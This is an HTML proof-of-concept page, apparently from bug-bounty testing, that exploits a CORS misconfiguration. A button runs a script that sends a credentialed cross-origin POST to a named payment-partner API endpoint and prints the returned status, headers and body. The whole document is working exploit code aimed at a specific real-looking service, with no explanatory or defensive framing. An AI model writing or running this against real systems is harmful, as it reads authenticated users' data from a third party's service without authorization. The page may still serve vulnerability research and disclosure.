<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC Exploit - Debug and changes</title>
  </head>
  <body>
    <h1>Proof of Concept - CORS Exploit (Debug Mode)</h1>
    <button onclick="exploit()">Run Exploit</button>

    <pre id="output"></pre>

    <script>
      function exploit() {
        const target = "https://partner-api.alipayplus.com/api/aplus/applySupport.json";

        fetch(target, {
          method: "POST",
          credentials: "include"
        })
        .then(async response => {
          let headers = "";
          response.headers.forEach((v, k) => {
            headers += k + ": " + v + "\n";
          });

          const text = await response.text();

          document.getElementById("output").textContent = 
            "Status: " + response.status + "\n\n" +
            "Headers:\n" + headers + "\n" +
            "Body:\n" + (text || "[empty body]");
        })
        .catch(error => {
          document.getElementById("output").textContent = "Error: " + error;
        });
      }
    </script>
  </body>
</html>
